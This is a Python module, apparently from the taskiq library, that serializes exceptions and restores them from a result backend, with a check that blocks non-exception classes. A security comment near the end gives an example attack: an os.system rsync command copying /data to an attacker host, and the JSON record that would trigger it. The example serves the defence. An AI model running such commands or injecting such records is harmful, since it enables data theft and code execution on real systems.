import sys
import traceback
from inspect import getmro
from itertools import takewhile
from typing import (  # noqa: WPS235
    Any,
    Generic,
    Iterable,
    List,
    Optional,
    Set,
    Tuple,
    Type,
    Union,
)

import pydantic
from typing_extensions import Protocol, TypeVar, runtime_checkable

import taskiq.exceptions  # noqa: WPS301

DecodedType = TypeVar("DecodedType")
EncodedType = TypeVar("EncodedType")

UNWANTED_BASE_CLASSES = (Exception, BaseException, object)
SEEN_EXCEPTIONS_CACHE: Set[int] = set()


@runtime_checkable
class Coder(Protocol, Generic[DecodedType, EncodedType]):  # pragma: no cover
    """Serializer protocol to check methods `loads` and `dumps`."""

    def loads(self, s: EncodedType) -> DecodedType:  # noqa: D102, WPS111
        ...

    def dumps(self, obj: DecodedType) -> EncodedType:  # noqa: D102
        ...


def _safe_str(obj: Any) -> str:
    if isinstance(obj, str):
        return obj
    try:
        return str(obj)
    except Exception as exc:
        return "<Unrepresentable {!r}: {!r} {!r}>".format(  # noqa: P101
            type(obj),
            exc,
            "\n".join(traceback.format_stack()),
        )


def safe_repr(obj: Any) -> str:
    """Safe form of repr, void of Unicode errors.

    :param obj: object
    :return: object representation
    """
    try:
        return repr(obj)
    except Exception:
        return _safe_str(obj)


def subclass_exception(
    name: str,
    parent: Type[Exception],
    module: str,
) -> Type[Exception]:
    """Create new exception class.

    :param name: cls name
    :param parent: cls parent
    :param module: cls module
    :return: new exception type
    """
    return type(name, (parent,), {"__module__": module})


def create_exception_cls(
    name: str,
    module: str,
    parent: Optional[Type[Exception]] = None,
) -> Type[Exception]:
    """Dynamically create an exception class.

    :param name: cls name
    :param module: cls module
    :param parent: cls parent
    :return: new exception type
    """
    if parent is None:
        parent = Exception

    return subclass_exception(name, parent, module)


def ensure_serializable(
    items: Iterable[DecodedType],
    coder: Coder[DecodedType, Any],
) -> Tuple[Union[DecodedType, str], ...]:
    """Ensure items will serialize.

    For a given list of arbitrary objects, return the object
    or a string representation, safe for serialization.

    :param items: values
    :param coder: serializaer
    :return: tuple of serializable values
    """
    safe_exc_args: List[Union[DecodedType, str]] = []

    for arg in items:
        try:
            coder.loads(coder.dumps(arg))
            safe_exc_args.append(arg)
        except Exception:
            safe_exc_args.append(safe_repr(arg))

    return tuple(safe_exc_args)


class _UnpickleableExceptionWrapper(Exception):
    """Wraps unpickleable exceptions."""

    def __init__(
        self,
        exc_module: str,
        exc_cls_name: str,
        exc_args: Tuple[Any, ...],
        text: str = "",
    ):
        self.exc_module = exc_module
        self.exc_cls_name = exc_cls_name
        self.exc_args = exc_args
        self.text = text

        super().__init__(exc_module, exc_cls_name, exc_args, text)

    def restore(self) -> Exception:
        return create_exception_cls(self.exc_cls_name, self.exc_module)(*self.exc_args)

    def __str__(self) -> str:
        return self.text

    @classmethod
    def from_exception(
        cls,
        exc: BaseException,
        coder: Coder[Any, Any],
    ) -> "_UnpickleableExceptionWrapper":
        res = cls(
            exc.__class__.__module__,
            exc.__class__.__name__,
            ensure_serializable(getattr(exc, "args", []), coder),
            safe_repr(exc),
        )
        res = res.with_traceback(exc.__traceback__)

        cause = exc.__cause__ and _prepare_exception(exc.__cause__, coder)
        if exc.__context__ and not exc.__suppress_context__:
            context = _prepare_exception(exc.__context__, coder)
        else:
            context = None

        if cause and not isinstance(cause, BaseException):
            cause = exc.__cause__
        if context and not isinstance(context, BaseException):
            context = exc.__context__

        res.__cause__ = cause  # type: ignore
        res.__context__ = context  # type: ignore
        res.__suppress_context__ = exc.__suppress_context__

        return res


def _itermro(
    cls: Type[BaseException],
    stop: Iterable[Type[Any]],
) -> Iterable[Type[BaseException]]:
    return takewhile(lambda sup: sup not in stop, getmro(cls))


def find_pickleable_exception(
    exc: BaseException,
    coder: Coder[Any, Any],
) -> Optional[BaseException]:
    """Find first pickleable exception base class.

    With an exception instance, iterate over its super classes (by MRO)
    and find the first super exception that's pickleable. It does
    not go below `Exception` (i.e., it skips `Exception`,
    `BaseException` and `object`).  If that happens
    you should use `UnpickleableException` instead.

    :param exc: exception
    :param coder: serializer
    :return: serializable exception or None
    """
    exc_args = getattr(exc, "args", [])
    for supercls in _itermro(exc.__class__, UNWANTED_BASE_CLASSES):
        try:
            superexc = supercls(*exc_args)
            coder.loads(coder.dumps(superexc))
            return superexc
        except Exception:  # noqa: S110
            pass  # noqa: WPS420

    return None


def get_pickleable_exception(
    exc: BaseException,
    coder: Coder[Any, Any],
) -> Optional[BaseException]:
    """Make sure exception is pickleable.

    :param exc: exception
    :param coder: serializer
    :return: serializable exception or None
    """
    try:
        coder.loads(coder.dumps(exc))
        return exc
    except Exception:  # noqa: S110
        pass  # noqa: WPS420

    nearest = find_pickleable_exception(exc, coder)
    if nearest:
        return nearest

    return _UnpickleableExceptionWrapper.from_exception(exc, coder)


def get_pickled_exception(exc: BaseException) -> BaseException:
    """Reverse of `get_pickleable_exception`.

    :param exc: can be UnpickleableExceptionWrapper
    :return: BaseException
    """
    if isinstance(exc, _UnpickleableExceptionWrapper):
        return exc.restore()

    return exc


class ExceptionRepr(pydantic.BaseModel):
    """Serialiable exception representation."""

    exc_type: str
    exc_message: Tuple[Any, ...]
    exc_module: Optional[str]
    exc_cause: Optional[Union[BaseException, "ExceptionRepr"]] = None
    exc_context: Optional[Union[BaseException, "ExceptionRepr"]] = None
    exc_suppress_context: bool = False

    class Config:
        arbitrary_types_allowed = True


def _prepare_exception(
    exc: BaseException,
    coder: Coder[Any, Any],
) -> Optional[Union[BaseException, ExceptionRepr]]:
    # Prevent infinite loop
    if id(exc) in SEEN_EXCEPTIONS_CACHE:
        return None

    SEEN_EXCEPTIONS_CACHE.add(id(exc))
    try:  # noqa: WPS501
        pickleable_exc = get_pickleable_exception(exc, coder)
        try:  # noqa: WPS505
            coder.loads(coder.dumps(pickleable_exc))
            return pickleable_exc
        except Exception:  # noqa: S110
            pass  # noqa: WPS420

        exctype = type(exc)

        cause = exc.__cause__ and _prepare_exception(exc.__cause__, coder)
        if exc.__context__ and not exc.__suppress_context__:
            context = _prepare_exception(exc.__context__, coder)
        else:
            context = None

        return ExceptionRepr(
            exc_type=getattr(exctype, "__qualname__", exctype.__name__),
            exc_message=ensure_serializable(getattr(exc, "args", []), coder),
            exc_module=exctype.__module__,
            exc_cause=cause,
            exc_context=context,
            exc_suppress_context=exc.__suppress_context__,
        )

    finally:
        SEEN_EXCEPTIONS_CACHE.discard(id(exc))


@pydantic.validate_arguments(config={"arbitrary_types_allowed": True})  # type: ignore
def prepare_exception(
    exc: BaseException,
    coder: Coder[Any, Any],
) -> Union[BaseException, ExceptionRepr]:
    """Prepare exception for serialization.

    :param exc: exception to encode
    :param coder: serializer with `loads` and `dumps`
    :return: serializable exception
    """
    SEEN_EXCEPTIONS_CACHE.clear()
    return _prepare_exception(exc, coder)  # type: ignore


@pydantic.validate_arguments(config={"arbitrary_types_allowed": True})  # type: ignore
def exception_to_python(  # noqa: C901, WPS210
    exc: Optional[Union[BaseException, ExceptionRepr]],
) -> Optional[BaseException]:
    """Convert serialized exception to Python exception.

    :param exc: encoded exception
    :raises SecurityError: exception isn't indead an exception
    :return: decoded exception or None
    """
    if not exc:
        return None

    if isinstance(exc, BaseException):
        return get_pickled_exception(exc)

    exc_module = exc.exc_module
    exc_type = exc.exc_type

    if exc_module is None:
        cls = create_exception_cls(exc_type, __name__)  # noqa: WPS117
    else:
        try:
            # Load module and find exception class in that
            cls = sys.modules[exc_module]  # type: ignore # noqa: WPS117
            # The type can contain qualified name with parent classes
            for name in exc_type.split("."):
                cls = getattr(cls, name)  # noqa: WPS117
        except (KeyError, AttributeError):
            cls = create_exception_cls(  # noqa: WPS117
                exc_type,
                taskiq.exceptions.__name__,
            )

    exc_msg = exc.exc_message

    # If the recreated exception type isn't indeed an exception,
    # this is a security issue. Without the condition below, an attacker
    # could exploit a stored command vulnerability to execute arbitrary
    # python code such as:
    # os.system("rsync /data attacker@192.168.56.100:~/data")
    # The attacker sets the task's result to a failure in the result
    # backend with the os as the module, the system function as the
    # exception type and the payload
    # rsync /data attacker@192.168.56.100:~/data
    # as the exception arguments like so:
    # {
    #   "exc_module": "os",
    #   "exc_type": "system",
    #   "exc_message": "rsync /data attacker@192.168.56.100:~/data"
    # }

    if not isinstance(cls, type) or not issubclass(cls, BaseException):
        fake_exc_type = exc_type if exc_module is None else f"{exc_module}.{exc_type}"
        raise taskiq.exceptions.SecurityError(
            f"Expected an exception class, got {fake_exc_type} with payload {exc_msg}",
        )

    # XXX: Without verifying `cls` is actually an exception class,
    #      an attacker could execute arbitrary python code.
    #      cls could be anything, even eval().
    try:
        exception = cls(*exc_msg)
    except Exception:
        exception = Exception(f"{cls}({exc_msg})")

    if exc.exc_cause:
        exception.__cause__ = exception_to_python(exc.exc_cause)
    if exc.exc_context:
        exception.__context__ = exception_to_python(exc.exc_context)

    exception.__suppress_context__ = exc.exc_suppress_context

    return exception
